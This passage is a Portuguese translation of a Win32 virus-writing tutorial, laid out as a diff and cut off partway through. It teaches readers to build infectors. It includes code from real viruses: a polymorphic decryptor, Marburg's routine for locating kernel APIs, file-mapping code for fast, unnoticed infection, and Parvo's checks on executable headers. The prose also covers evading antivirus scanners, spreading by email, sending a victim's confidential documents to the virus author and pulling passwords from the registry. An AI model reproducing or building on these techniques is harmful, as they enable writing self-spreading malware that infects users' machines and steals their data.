@@ -1,0 +1,1050 @@
+   ___________________________________________________________________
+  |                                                                   |
+  |  Introdução a programação de vírus em Win32                       |
+  |                                                                   |
+  |                                          GriYo <griyo@akrata.org> |
+  |                                           traduzido por Dr Herman | 
+  |___________________________________________________________________|
+
+
+  Índice
+
+    Olhando o passado
+    Um alfabeto infinito
+    Quem escondeu a caixa de ferramentas ?
+    Tudo que queriámos fazer
+    Memória fotográfica
+    Proteção contra erros
+    Um muro alto, mas com portas
+    Tem mensagem pra você
+  
+
+  -----------------
+  Olhando o passado
+  -----------------
+
+  Se dermos um passeio pela Internet buscando páginas especializadas
+  em vírus, encontraremos uma porrada de documentos, coleções de 
+  vírus, fontes, links "mortos" e todo tipo de informação totalmente
+  obsoleta. O motivo disso é o desaparecimento paulatino do MSDOS.
+  Cerca 90% dos 30.000 vírus existentes hoje são vírus MSDOS. A 
+  maioria destes vírus que foram tão famosos deixaram de funcionar
+  com o aparecimento do Windows. Muitos vírus utilizam métodos não-
+  documentados e pouco compatíveis e, da mesma maneira que ocorre
+  com os "exploits" e com os "denail of service", as técnicas 
+  utilizadas deixam de funcionar, e os problemas de segurança diminuem
+  (embora em algumas ocasiões aumentem). Com o aparecimento do Windows 
+  3.0 muitos vírus perderam a compatibilidade, mas a "cena" ainda 
+  estava muito concorrida, e não tardou a aparecerem trabalhos 
+  orientados a este novo enfoque. O mesmo aconteceu com a chegada 
+  das sucessivas versões do Windows anteriores ao 95. Trabalhos como 
+  o vírus "Sucksexee" (também conhecido como "Implant.6128") levaram 
+  ao extremo a capacidade do MSDOS. Algumas características deste 
+  vírus são:
+
+    - Full-stealth:
+
+    Esta técnica consiste em ocultar totalmente a existência do vírus.
+    Se abrirmos um arquivo infectado, este parecerá normal. O mesmo
+    ocorre se tentarmos usar um debugger. Não se nota nenhum aumento
+    no tamanho dos executáveis, com exceção de alguns que crescem
+    cerca de 6Kb.
+
+    - Retro-vírus:
+
+    O vírus foi desenhado para atacar diretamente o anti-vírus. Um
+    exemplo: estando o vírus ativo em memória antes de executarmos o
+    conhecido anti-vírus ThunderByte, certos parâmetros são colocados
+    automaticamente na linha de comandos, de forma que a "busca"
+    (scan) em memória fosse desativada sem que o usuário percebesse.
+    Outra característica "retro" deste vírus é sua capacidade de
+    desativar o "boot" a partir de disquetes, o que obrigava o "boot"
+    a partir do HD da máquina já infectada.
+
+
+    - Polimorfismo:
+   
+    Esta técnica surgiu com autores como Dark Avenger com seu 
+    "Mutation Engine" ou com o grupo holandês Trident e seu "TPE".
+    A idéia básica era criar um procedimento que percorre o vírus, 
+    encriptando cada byte. Este procedimento deve ser gerado de  
+    forma que variasse de infecção a infecção. As possíveis variações
+    deste procedimento são:
+   
+      . percorrer o vírus desde ao endereço de memória mais baixa,
+        incrementando a cada iteração o ponteiro que faz referência
+        a este endereço de memória. O caso oposto, percorrer o vírus
+        do final (endereço de memória mais alto) até o início,
+        decrementando o ponteiro a cada iteração. A cada iteração o
+        ponteiro incrementaria ou decrementaria, mas esta variação
+        poderia ser de 1 ou 2 bytes, visto que o 8086 e seus sucessores
+        permitem realizar operações com bytes ou words.
+
+      . a operação aritmética usada para encriptar o vírus também é
+        variável. Qualquer uma serve, por mais simples que seja -- o
+        importante é alcançar a máxima variação. A rotina pode 
+        percorrer o vírus somando 01h a cada byte, restando, fazendo 
+        um OU EXCLUSIVO (XOR) ou deslocando o cada valor um número de 
+        bits para a esquerda ou direita. O importante é que a operação
+        utilizada seja concissa e tenha uma inversa.         
+
+    Como vimos, é possível fazer infinitas combinações e este é o
+    segredo. Os anti-vírus, naqueles tempos, realizam a busca de
+    arquivos infectados mediante uma comparação de cadeias (strings).
+    O anti-vírus abria cada arquivo do disco e buscava em seu interior
+    fragmentos do vírus. Este método apresentava problemas claramente
+    evidentes:
+
+    É necessário conhecer a cadeia que se quer buscar, por que só podem
+    ser detectados aqueles vírus "conhecidos" pelo anti-vírus. Com o
+    crescimento do número de vírus, crescia a quantidade de cadeias a
+    serem buscadas em cada arquivo e conseqüentemente, o tempo de
+    verificação (scan).
+
+    O polimorfismo significou o fim de todos os métodos de detecção. Um
+    vírus polimórfico apresenta um número tão elevado de mutações que 
+    seria impossível armazenar e buscar todas suas variantes.
+    
+    - Multi-partes (multipartite):
+    
+    O vírus infecta múltiplos alvos num mesmo sistema. Neste caso, trata-se
+    do vírus MBR (Master Boot Record), os arquivos com extensão .COM, os 
+    arquivos .EXE e inclusive os arquivos .SYS. Encontramos esta 
+    característica em sua máxima expressão nos vírus multi-plataforma.
+
+    Eu me atreveria dizer que dificilmente se poderia chegar tão longe
+    com técnicas utilizadas sem afetar a capacidade do sistema, mas
+    então os desenvolvedores de antivirus disseram que estavam com a 
+    solução definitiva. Surgia a busca heurística, baseada na aplicação 
+    de técnicas de inteligência artificial. Mas todos nós sabemos que 
+    por mais 'inteligente' que seja um programa de computador, jamais 
+    será igual a um ser humano, e não tardou a aparecer técnicas 
+    *anti-heuristícas*. 
+
+
+  Mas vejamos um pouco mais sobre a busca heurística. Trata-se de
+  examinar um programa em busca de sinais de infecção. Um vírus, quando
+  infecta um executável, precisa fazer algumas mudanças nele, sendo que
+  estas mudanças são suspeitas para o antivírus. Os "motores" 
+  heurísticos mais avançados são capazes de detectar vírus polimórficos,
+  já que detectam a rotina de encriptação que falamos anteriormente, 
+  e ainda chegam mais longe, e com emulação são capazes de desfazer
+  esta rotina e obter uma imagem clara do vírus, podendo aplicar então
+  a busca por cadeia tradicional. O problema da busca heurística está
+  em que esta oferece sempre uma solução, mesmo que não seja correta.
+  Estou me referindo aos falsos positivos, quer dizer, programas que
+  por suas características especiais dão positivo ao se buscar um vírus
+  neles. Em mais de uma ocasião, antivírus conhecidos deram como infectado 
+  alguns arquivos do sistema, juntamente com uma avalanche de usuários 
+  aborrecidos. Com a aparição do Windows 95 e a nova plataforma Win32, 
+  todas estas técnicas, dependentes do funcionamento interno do MSDOS,
+  deixaram de funcionar. A maioria dos vírus de boot se delatam ao 
+  infectar uma máquina com Windows 95, que incorpora alguns mecanismos 
+  de proteção contra vírus, mesmo que básicos e primitivos. Outro 
+  exemplo de perda de funcionalidade são os vírus "stealth", já que 
+  empregam técnicas incompatíveis com o novo formato de nomes extensos 
+  e novas funções de busca de arquivos do sistema.
+
+  O desenvolvimento de vírus parou por um tempo. Continuavam a surgir
+  vírus de MSDOS, mas o perigo já estava longe. Apareceram as primeiras
+  tentativas na plataforma Win32, na mão do sempre inovador grupo VLAD
+  e seu vírus Bizatch (chamado de Boza pelos programadores de antivírus).
+  Este vírus utiliza técnicas primitivas que impediam seu funcionamento
+  correto (como assumir endereços fixos em memória para o kernel e suas
+  funções), mas era um primeiro passo que seguramente motivou muitos
+  outros autores que não demoraram em dar o passo e começar a estudar
+  a nova plataforma. Foi neste passo, para alguns passos de gigante,
+  que a maior parte da cena desapareceu. As páginas web que antes 
+  continham informações pontuais sobre a cena, deixaram de ser 
+  atualizadas com tanta regularidade, devido a falta de avanços e
+  descobrimentos. Apenas alguns grupos concentraram suas forças na
+  nova plataforma, e apareceram as primeiras tentativas sérias, das
+  mãos de grupos como IKX ou 29A. Jacky Qwerty, autor do grupo 29A
+  foi sem dúvida um dos pioneiros da tecnologia virótica sob 32 bits.
+  Seus vírus Jacky e Cabanas criaram as bases do que logo seriam 
+  infectadores mais completos e avançados.
+
+  Os desenvolvedores de anti-vírus ainda estavam pensando como portar
+  seus "motores" de busca heurística para Win32 quando apareceu o 
+  primeiro vírus polimórfico capaz de infectar executáveis de Win32. 
+  Marburg pegou muitos de calças baixas, e chegou até a aparecer nos 
+  cdroms de revistas amplamente difundidas como PcGamer e PcPowerPlay.
+
+  As primeiras amostras do vírus Marburg caíram nas mãos dos 
+  desenvolvedores de anti-vírus em agosto de 1998, quando o vírus 
+  estava 9 meses "in the wild" (espalhando-se de modo aleatório pelo 
+  mundo). Não tardaram um ou dois meses mais para que adaptar seus 
+  pacotes para afrontar este novo ataque. A guerra estava declarada 
+  novamente.
+
+  A nova plataforma supõe um esforço extra na hora de desenvolver um
+  vírus, mas seu maior potencial coloca nas mãos dos programadores
+  armas mais potentes. Descrever este novo potencial e sua aplicação ao
+  se desenvolver um vírus é  o objetivo deste artigo.
+
+
+  --------------------
+  Um alfabeto infinito
+  --------------------
+
+  Está claro que 16 bits não é o mesmo que 32 bits, mas que diferença
+  isso faz na hora de projetar um motor de polimorfismo ? Para começar,
+  não contamos apenas com registros de 16 bits (ax, bx, etc...) mas
+  sim com toda a potência do conjunto de registros estendidos (eax,
+  ebx, etc...). Uma primeira melhora sobre o motor de polimorfismo de
+  16 bits seria aumentar os 16 bits que faltam para chegar a 32. 
+  Vejamos um exemplo com uma instrução simples no assembly, MOV com 
+  o registro acumulador como destino. Onde antes apenas poderíamos 
+  gerar:
+  
+                MOV AL,imm8bit
+                MOV AH,imm8bit
+                MOV AX,imm16bit
+
+  Agora contamos com as seguintes possibilidades:
+
+                MOV AL,imm8bit
+                MOV AH,imm8bit
+                MOV AX,imm16bit
+                MOV EAX,imm32bit
+  
+  Isso apenas supõe um incremento na variabilidade de uma instrução,
+  mas se apliarmos o exemplo para o resto dos registros e para o
+  resto das instruções veremos que se trata de uma importante melhora.
+  Outro aspecto importante está no acesso a memória que a rotina 
+  realiza na hora de desencriptar o vírus. Nos motores de polimorfismo
+  antigos contávamos com o acesso byte a byte ou word a word. Exemplo:
+
+                ADD BYTE PTR DS:[mem],imm8bit
+                ADD WORD PTR DS:[mem],imm16bit
+
+  
+  Visto que agora usamos  Win32, não apenas podemos nos livrar dos 
+  registros de segmento (a memória parece seqüencial no ponto de vista
+  de uma aplicação e não segmentada), como podemos contar com 
+  instruções que acessam posições de memória de 32 bits. O exemplo 
+  anterior seria expandido em:
+
+
+                ADD BYTE PTR [mem],imm8bit
+                ADD WORD PTR [mem],imm16bit
+                ADD DWORD PTR [mem],imm32bit
+
+  Novamente, temos apenas uma possibilidade de variação, mas repito, 
+  se aplicarmos todas as possíveis instruções teremos uma bonita 
+  explosão combinatória. Uma delas foi formada pelos novos métodos 
+  de indexação, onde antes tinhamos:
+
+                ADD BYTE PTR DS:[reg],imm8bit
+                ADD BYTE PTR DS:[reg+imm],imm8bit
+
+  Agora nos deparamos com as seguintes possibilidades:  
+
+                ADD BYTE PTR [reg],imm8bit
+                ADD BYTE PTR [reg+imm],imm8bit
+                ADD BYTE PTR [reg+reg],imm8bit
+                ADD BYTE PTR [reg+reg+imm],imm8bit
+
+  Além disso, podemos utilizar algum dos exóticos modos de indexação do
+  386+ como por exemplo [reg*02h]. Aqui temos mais possibilidades, que
+  se multiplicam ao aplicar o exemplo não apenas em ADD e as referências
+  a BYTE, mas a todo o resto das instruções e ao resto dos tamanhos do
+  operador (WORD e DWORD). Evidentemente, um grande potencial, e olhe
+  que apenas estamos falando de instruções e registros. A geração 
+  automática de código polimórfico alcança seus vôos mais altos em 
+  motores capazes de seguir a evolução do código que geraram, conhecendo
+  em qualquer momento o estado de qualquer registro ou mesmo seu valor.
+  Continuando, podemos observar um trecho do desencriptador polimórfico
+  que o vírus Win32.Influenza utiliza para ocultar sua presença nos
+  arquivos infectados:
+
+                :00401376 E81D000000     call   00401398
+                .                        .
+                .                        .
+                .                        .
+                :00401398 BE5F4D853E     mov    esi,3E854D5F
+                :0040139D 87DE           xchg   esi,ebx
+                :0040139F 5B             pop    ebx
+                :004013A0 668BFB         mov    di,bx
+                :004013A3 8BF8           mov    edi,eax
+                :004013A5 66BDB0C8       mov    bp,C8B0
+                :004013A9 5D             pop    ebp
+                :004013AA 0F8C03000000   jl     004013B3
+                :004013B0 6687D3         xchg   bx,dx
+                :004013B3 FD             std
+                :004013B4 664B           dec    bx
+                :004013B6 E9AA260100     jmp    00413A65
+                .                        .
+                .                        .
+                .                        .
+                :00413A65 E815000000     call   00413A7F
+                .                        .
+                .                        .
+                .                        .
+                :00413A7F 87FA           xchg   edx,edi
+                :00413A81 F8             clc
+                :00413A82 664F           dec    di
+                :00413A84 5B             pop    ebx
+                :00413A85 8AEE           mov    ch,dh
+                :00413A87 E912000000     jmp    00413A9E
+
+
+  Podemos observar como o código gerado apresenta uma estrutura 
+  complexa similar a de um programa real. O motor de polimorfismo não 
+  tem problemas para gerar estruturas como a instrução CALL do endereço
+  de memória 00401376, que transfere o controle para uma posição mais
+  adiante. No endereço 0040139F encontramos uma instrução POP que
+  restaura a pilha, eliminando o endereço de retorno guardado pela
+  chamada anterior.
+
+
+  --------------------------------------
+  Quem escondeu a caixa de ferramentas ?
+  --------------------------------------
+  
+  Nos vírus baseados em MSDOS utilizávamos as interrupções que nos
+  permitiam acessar funções do MSDOS (int 21h) ou da BIOS (int 13h).
+  Todas estas funções que utilizávamos para abrir um arquivo ou 
+  escrever nele agora residem em DLLs, neste caso na KERNEL32.DLL. 
+  Localizar o endereço em memória onde reside este módulo é vital, e 
+  para isso contamos com vários truques. O vírus pode localizar as 
+  funções utilizadas pelo programa que o hospeda, e utilizá-las para 
+  infectar. Isso implicaria numa grave limitação: se um executável não 
+  utiliza alguma das funções necessárias para o funcionamento do vírus,
+  este executável não poderia ser infectado. Uma forma de evitar este
+  problema:
+
+    O vírus localiza o lugar onde o programa hospedeiro guarda o 
+    endereço da função GetModuleHandle e da função GetProcAddress. 
+    Estas funções são utilizadas por praticamente todos os executáveis 
+    do Windows, e permitem que o vírus localize o endereço de memória 
+    onde reside o módulo do kernel (GetModuleHandle), assim como todas 
+    as suas funções exportadas (GetProcAddress).
+
+  Outra possibilidade é rastrear a memória em busca do kernel mas, é
+  claro, isso não é tão fácil com parece, já que se durante esta busca
+  acessarmos um endereço protegido ou não atribuído, provocaremos um 
+  erro de proteção, e conseqüentemente aquela mensagem que indica que 
+  nosso programa executou uma instrução inválida. Para evitar isso, 
+  contamos com uma das características mais úteis do Win32, que 
+  trataremos com detalhes mais adiante, estou me referindo a SEH 
+  (Structered Exception Handling).
+
+  Existem outros métodos e seguramente aparecerão outros, mas estes 
+  dois são os mais eficazes quando escrevi este. Uma vez que o vírus 
+  tem acesso as API's do sistema, praticamente não há nada o que não 
+  possa ser feito. Ou há? Para começar, o vírus pode colocar em 
+  funcionamento as APIs SetModuleHandle e GetProcAddress que servirá 
+  de ponto de entrada para uma porção de funções do kernel. Exemplo:
+
+    CreateFile 
+    CreateFileMapping 
+    CloseHandle 
+    CopyFile 
+    CreateProcess 
+    DeleteFile 
+    FileTimeToSystemTime 
+    FindClose 
+    FindFirstFile 
+    FindNextFile 
+    FreeLibrary 
+    GetCurrentDirectory 
+    GetCurrentProcess 
+    GetFileAttributes 
+    GetFileSize 
+    GetModuleFilename 
+    GetSystemDirectory 
+    GetTempPath 
+    GetWindowsDirectory 
+    LoadLibrary 
+    MapViewOfFile 
+    MoveFile 
+    SetEndOfFile 
+    SetFileAttributes 
+    SetFileTime 
+    SystemTimeToFileTime 
+    UnmapViewOfFile 
+    VirtualAlloc 
+    WriteProcessMemory 
+
+  Algumas ou todas estas APIs podem ser utilizadas no vírus. Destaco a
+  função LoadLibrary, que nos permitirá carregar na rotina qualquer
+  módulo do Windows e utilizar suas APIs.
+
+  O seguinte fragmento pertence ao vírus Marburg. Trata-se da rotina 
+  encarregada de localizar cada uma das APIs do kernel necessárias para
+  o funcionamento do vírus, todo ele com a ajuda de GetProcAddress. 
+
+        get_K32_APIs:   push ebx
+                        lea esi,dword ptr [ebp+viral_functions]
+                        lea edi,dword ptr [ebp+viral_addresses]
+                        mov ecx,(offset viral_tbl_end-offset viral_functions)/04h
+        get_each_ep:    cld
+                        lodsd
+                        add eax,ebp
+                        push ecx
+                        push esi
+                        push edi
+                        push eax
+                        push dword ptr [ebp+a_Kernel32]
+                        call dword ptr [ebp+a_GetProcAddr]
+                        pop edi
+                        pop esi
+                        pop ecx
+                        or eax,eax
+                        jz exit_get_func
+                        cld
+                        stosd
+                        loop get_each_ep
+        exit_get_func:  mov ecx,eax
+                        pop ebx
+                        ret
+
+        viral_functions equ this byte
+
+                        dd offset szCreateFileA
+                        dd offset szCreateFileMap
+                        dd offset szMapViewOfFile
+                        dd offset szUnmapView
+                        dd offset szCloseHandle
+                        dd offset szFindFirst
+                        dd offset szFindNext
+                        dd offset szFindClose
+                        dd offset szVirtualAlloc
+                        dd offset szGetWinDir
+                        dd offset szGetSysDir
+                        dd offset szGetCurDir
+                        dd offset szSetFileAttr
+                        dd offset szSetFileTime
+                        dd offset szDeleteFile
+                        dd offset szGetCurProc
+                        dd offset szWriteProcMem
+                        dd offset szLoadLibrary
+                        dd offset szGetSysTime
+
+        viral_tbl_end   equ this byte
+
+        szGetModuleH    db "GetModuleHandleA",00h
+        szGetProcAddr   db "GetProcAddress",00h
+        szCreateFileA   db "CreateFileA",00h
+        szCreateFileMap db "CreateFileMappingA",00h
+        szMapViewOfFile db "MapViewOfFile",00h
+        szUnmapView     db "UnmapViewOfFile",00h
+        szCloseHandle   db "CloseHandle",00h
+        szFindFirst     db "FindFirstFileA",00h
+        szFindNext      db "FindNextFileA",00h
+        szFindClose     db "FindClose",00h
+        szVirtualAlloc  db "VirtualAlloc",00h
+        szGetWinDir     db "GetWindowsDirectoryA",00h
+        szGetSysDir     db "GetSystemDirectoryA",00h
+        szGetCurDir     db "GetCurrentDirectoryA",00h
+        szSetFileAttr   db "SetFileAttributesA",00h
+        szSetFileTime   db "SetFileTime",00h
+        szDeleteFile    db "DeleteFileA",00h
+        szGetCurProc    db "GetCurrentProcess",00h
+        szWriteProcMem  db "WriteProcessMemory",00h
+        szLoadLibrary   db "LoadLibraryA",00h
+        szGetSysTime    db "GetSystemTime",00h
+
+        viral_addresses equ this byte
+
+        a_CreateFile    dd 00000000h
+        a_CreateFileMap dd 00000000h
+        a_MapViewOfFile dd 00000000h
+        a_UnmapView     dd 00000000h
+        a_CloseHandle   dd 00000000h
+        a_FindFirst     dd 00000000h
+        a_FindNext      dd 00000000h
+        a_FindClose     dd 00000000h
+        a_VirtualAlloc  dd 00000000h
+        a_GetWindowsDir dd 00000000h
+        a_GetSystemDir  dd 00000000h
+        a_GetCurDir     dd 00000000h
+        a_SetFileAttr   dd 00000000h
+        a_SetFileTime   dd 00000000h
+        a_DeleteFile    dd 00000000h
+        a_GetCurProc    dd 00000000h
+        a_WriteProcMem  dd 00000000h
+        a_LoadLibrary   dd 00000000h
+        a_GetSysTime    dd 00000000h
+
+
+  ------------------------
+  Tudo que queriámos fazer
+  ------------------------
+
+  Utilizando as API's do kernel LoadLibrary e GetProcAddress podemos
+  carregar qualquer módulo do Windows e obter os endereços das API's 
+  que nos interessam dentro deles. Assim poderemos incluir em nosso 
+  vírus muitas características novas que antes eram impensáveis quando
+  trabalhávamos com o MSDOS. Eis alguns módulos cujas API's podemos 
+  usar:
+
+    USER32.DLL e GDI32.DLL 
+    ----------------------
+    O coração da interface gráfica que fez o Windows tão famoso está a
+    nossa disposição para facilitarmos as coisas na hora de criar
+    "payloads" vistosos para nossos vírus.
+   
+    WSOCK32.DLL 
+    -----------
+    Esta biblioteca proporciona uma gama de funcões orientadas a 
+    aplicações que usam TCP/IP. Com sua ajuda podemos criar aplicações
+    como um cliente FTP ou um cliente TELNET, mas também podemos as
+    utilizar dentro de um vírus para, por exemplo, conectar com um
+    servidor de mail, compor e enviar a mensagem. Esta mensagem pode ser
+    enviada para outros usuários junto com uma cópia do vírus (mail
+    spreading) ou pode enviar para uma conta pertencente ao autor do
+    vírus documentos confidenciais localizados na máquina contaminada.
+
+    WININET.DLL
+    -----------
+    Este módulo contêm funções destinadas a facilitar tarefas típicas de 
+    aplicações orientadas a Internet. Dentro deste módulo encontraremos
+    funções que nos permitam conectar ao nosso provedor Internet,
+    trasmitir arquivos (FTP), descarregar páginas web ou brincar com os
+    "cookies".
+   
+    MAPI32.DLL 
+    ----------
+    Este módulo abriga as funções de mensagens do Windows. Com a mesma
+    podemos construir de forma compacta um email e anexar um arquivo no
+    mesmo. Nem sempre encontraremos este módulo no sistema, e sua
+    utilização provoca em certas ocasiões o aparecimento de mensagens
+    indicando o estado da operação que está sendo realizada (a típica
+    mensagem mostrada pelo Outlook: "conectando com o servidor" ou
+    "enviando mensagem"). É por isso que, mesmo simplificando as tarefas
+    de enviar correio, não é recomendável sua utilização num vírus, onde
+    se supõe que deva ser um pouco mais "discreto".
+   
+    ADVAPI32.DLL 
+    ------------
+    O registro do sistema é sem dúvida uma importantíssima fonte de
+    informação. Nele podemos extrair nomes de diretórios, servidores, 
+    senhas e todo tipo de informação  *sensible*.
+
+  Estes são alguns dos módulos mais "gulosos" cujas funções podemos
+  utilizar nos nossos vírus, mas existe toda uma pilha de módulos
+  destinados a múltiplas tarefas. Não temos mais que fechar os olhos para
+  o diretório SYSTEM32. Outros módulos interessantes para a programação
+  de vírus poderiam ser: NETAPI32.DLL, SHELL32.DLL, RASAPI.DLL,
+  OPENGL32.DLL ...
+
+
+  -------------------
+  Memória fotográfica
+  -------------------
+  
+  Esta característica do Win32 nos dá a possibilidade de trazermos um
+  executável inteiro para a memória, por maior que seja, e acessá-lo 
+  facilmente utilizando com índice o endereço de memória onde foi
+  mapeado. Desta forma evitamos os constantes acessos a disco e
+  deslocamentos desnecessários do ponteiro de leitura/escrita. O
+  procedimento é o seguinte:
+
+  Obtemos um handle para o arquivo que queremos abrir utilizando 
+  CreateFile.
+
+  Mapeamos o arquivo em memória usando a API CreateFileMapping.
+
+  Uma vez mapeado, obtemos o endereço base em memória onde foi mapeado o
+  arquivo utilizando MapViewOfFile. 
+
+  Uma vez que trouxemos o executável inteiro para a memória (se for muito
+  grande o Windows se encarrega de fazer o correspondente swap), podemos
+  percorrer sua estrutura interna sem problemas, apenas teremos que somar
+  o endereço base com o deslocamento que queremos acessar. Os arquivos
+  mapeados em memória permitem que um vírus infecte uma grande quantidade
+  de arquivos em pouco tempo e sem que seja percebido.
+
+  Vejamos um exemplo de como funcionam estas APIs: 
+
+                xor eax,eax                                     ;
+                push eax                                        ;
+                push FILE_ATTRIBUTE_NORMAL                      ; Atributos
+                push OPEN_EXISTING                              ; Ação
+                push eax                                        ;
+                push eax                                        ;
+                push GENERIC_WRITE or GENERIC_READ              ; Modo de acceso
+                lea eax,dword ptr [ebp+file2open]               ; Nome do arquivo
+                push eax                                        ;
+                call dword ptr [ebp+a_CreateFileA]              ;
+                cmp eax,INVALID_HANDLE_VALUE                    ; Erro ?
+                je error_createfile                             ;
+                mov dword ptr [ebp+h_CreateFile],eax            ; Guardamos o handle
+                xor eax,eax                                     ;
+                push eax                                        ;
+                push dword ptr [ebp+size]                       ; Tamanho do arquivo
+                push eax                                        ;
+                push PAGE_READWRITE                             ; Direitos
+                push eax                                        ;
+                push dword ptr [ebp+h_CreateFile]               ; Handle
+                call dword ptr [ebp+a_CreateFileMappingA]       ;
+                or eax,eax                                      ; Erro ?
+                jz error_filemap                                ;
+                mov dword ptr [ebp+h_FileMap],eax               ; Guardamos o handle
+                xor eax,eax                                     ;
+                push dword ptr [ebp+size]                       ; Tamanho do arquivo
+                push eax                                        ;
+                push eax                                        ;
+                push FILE_MAP_READ or FILE_MAP_WRITE            ; Modo de acceso
+                push eax                                        ;
+                call dword ptr [ebp+a_MapViewOfFile]            ;
+                or eax,eax                                      ; Erro ?
+                jz error_view                                   ;
+                mov dword ptr [ebp+base_addr],eax               ; Guardamos o endereço
+
+
+  Como resultado da executação satisfatória do código anterior, teremos
+  um ponteiro (que guardamos no endereço local indicado por base_addr)
+  para o arquivo em memória. Utilizaremos este ponteiro para ler ou
+  escrever na memória, refletindo estas leituras e escritas no arquivo
+  em disco. Uma limitação desta técnica é que não podemos aumentar o
+  arquivo uma vez aberto.
+
+  No código anterior podemos observar que um dos parâmetros de chamada
+  destas API's é o tamanho do arquivo. Pois bem, teremos que abrir o
+  arquivo indicando seu tamanho mais o tamanho requerido pelo vírus. Mas
+  na primeira vez que abrimos o arquivo ainda não sabemos se ele é uma
+  vítima válida. Algumas soluções para este problema:
+
+    Abrir o arquivo com acesso apenas de leitura e respeitando seu 
+    tamanho original.
+   
+    Uma vez que comprovarmos que se trata de um arquivo apto para
+    infecção fechamos o *FileMapping* e voltamos a criar, especificando
+    desta vez o tamanho original mais o tamanho necessário para abrigar
+    o vírus.
+
+    Outra possibilidade seria abrir o arquivo e criar uma imagem sua em
+    memória apenas uma vez, incluíndo o tamanho do vírus. Se ao
+    inspeccionar o executável descobrirmos que não está apto para a
+    infecção, restauraremos o tamanho original utilizando a API
+    "SetEndOfFile".
+
+
+  ---------------------
+  Proteção contra erros
+  ---------------------
+
+  O tratamento de erros (Structured Exception Handling) é sem dúvida
+  uma das características mais interessantes e mais utilizadas do Win32
+  e uma das menos documentadas, pelo menos no que se refere seu
+  funcionamento interno. Descrever o funcionamento e a implemantação
+  desta técnica poderia ser o objetivo de um outro artigo, e
+  consequentemente não será tratado aqui. Para obter mais informação
+  visite minha página web (BioTech), na seção "PAPERS" encontrará o
+  artigo "A Crash Course on th Depths of Win32 Structured Exception
+  Handling". Um artigo interessantíssimo escrito por Matt Pietrek (autor
+  de livros como "Windows 95 System Programming Secrets") sobre as
+  entranhas do "SEH".
+
+
+  ----------------------------
+  Um muro alto, mas com portas
+  ----------------------------
+
+  A Microsoft introduziu um novo formato para os arquivos executáveis
+  com a chegada da plataforma Win32. O novo formato, chamado "Portable
+  Executable", que parece ser mais completo a primeira vista, apresenta
+  uma estrutura hierarquizada que, uma vez compreendida as estruturas
+  internas que lhe formam, facilita bastante o trabalho de busca, 
+  análise e modificação dos campos que nos interessam.
+
+  O primeiro que encontrarmos ao analizar a estrutura de um PE é o
+  cabeçalho MSDOS. Trata-se do mesmo cabeçalho que possuem os arquivos
+  .EXE do MSDOS. Sua finalidade é mostrar uma mensagem que diz algo como
+  "This program cannot be run in DOS mode", quando tentamos executar uma
+  aplicação do Windows estando no MSDOS.
+
+  O cabeçalho dos arquivos .EXE do MSDOS possui uma marca que permite
+  identificá-lo como tal. Podemos vê-la se abrirmos algum executável com
+  um editor hexadecimal -- trata-se dos caracteres "MZ". Do mesmo modo, o
+  cabeçalho PE é identificado pela cadeia (string) "PE\0\0" que
+  encontramos como o primeiro campo.
+
+  A continuação aparece em "FileHeader", que obtem informação básica
+  sobre o arquivo, como o número de seções que possui ou a data e hora em
+  que foi "linkado". Vejamos a declaração da estrutura:
+
+
+        IMAGE_FILE_HEADER                     STRUC
+
+              FH_Machine                      DW ?
+              FH_NumberOfSections             DW ?
+              FH_TimeDateStamp                DD ?
+              FH_PointerToSymbolTable         DD BYTE PTR ?
+              FH_NumberOfSymbols              DD ?
+              FH_SizeOfOptionalHeader         DW ?
+              FH_Characteristics              DW ?
+
+         IMAGE_FILE_HEADER                    ENDS
+
+  IMAGE_SIZEOF_FILE_HEADER                    EQU SIZE IMAGE_FILE_HEADER
+
+   
+  Segue a "OptionalHeader", que mesmo com seu nome "optional" contém
+  informação concreta e indispensável para a correta interpretação do
+  resto do executável. Esta é a declaração:
+
+
+        IMAGE_OPTIONAL_HEADER                 STRUC
+ 
+              ; Campos padrão:
+
+              OH_Magic                        DW ?
+              OH_MajorLinkerVersion           DB ?
+              OH_MinorLinkerVersion           DB ?
+              OH_SizeOfCode                   DD ?
+              OH_SizeOfInitializedData        DD ?
+              OH_SizeOfUninitializedData      DD ?
+              OH_AddressOfEntryPoint          DD BYTE PTR ?
+              OH_BaseOfCode                   DD BYTE PTR ?
+              OH_BaseOfData                   DD BYTE PTR ?
+
+              ; Campos adicionais NT:
+    
+              OH_ImageBase                    DD BYTE PTR ?
+              OH_SectionAlignment             DD ?
+              OH_FileAlignment                DD ?
+              OH_MajorOperatingSystemVersion  DW ?
+              OH_MinorOperatingSystemVersion  DW ?
+              OH_MajorImageVersion            DW ?
+              OH_MinorImageVersion            DW ?
+              OH_MajorSubsystemVersion        DW ?
+              OH_MinorSubsystemVersion        DW ?
+              OH_Reserved1                    DD ?
+              OH_SizeOfImage                  DD ?
+              OH_SizeOfHeaders                DD ?
+              OH_CheckSum                     DD ?
+              OH_Subsystem                    DW ?
+              OH_DllCharacteristics           DW ?
+              OH_SizeOfStackReserve           DD ?
+              OH_SizeOfStackCommit            DD ?
+              OH_SizeOfHeapReserve            DD ?
+              OH_SizeOfHeapCommit             DD ?
+              OH_LoaderFlags                  DD ?
+              OH_NumberOfRvaAndSizes          DD ?
+              
+              UNION
+              OH_DataDirectory                IMAGE_DATA_DIRECTORY    \
+                                              IMAGE_NUMBEROF_DIRECTORY_ENTRIES \
+                                              DUP (?)
+              OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
+              ENDS
+
+IMAGE_OPTIONAL_HEADER                         ENDS
+
+IMAGE_SIZEOF_STD_OPTIONAL_HEADER              EQU   28d
+IMAGE_SIZEOF_NT_OPTIONAL_HEADER               EQU   SIZE IMAGE_OPTIONAL_HEADER
+
+
+  No arquivo PE.INC encontrará a declaração do resto das estruturas que
+  compõem o cabeçalho PE. Como exemplo de acesso a estas estruturas
+  vemos, na continuação, um fragmento do vírus Win32.Parvo, no qual o
+  vírus verifica alguns campos do cabeçalho PE para comprovar se o
+  executável está apto para o método de infecção utilizado:
+
+                ; Verificar se a marca MZ está presente no endereço base
+                ; do arquivo mapeado em memória
+
+                cld
+                cmp word ptr [ebx],IMAGE_DOS_SIGNATURE
+                jne inf_close_file
+
+                ; Checar a posição da "relocation table"
+
+                cmp word ptr [ebx+MZ_lfarlc],0040h
+                jb inf_close_file
+
+                ; Agora verificamos o cabeçalho PE e verificamos se
+                ; podemos encontrar ali a marca que a identifica
+
+                mov esi,dword ptr [ebx+MZ_lfanew]
+                add esi,ebx
+                lodsd
+                cmp eax,IMAGE_NT_SIGNATURE
+                jne inf_close_file
+
+                ; Verificar a CPU para a qual foi compilado este
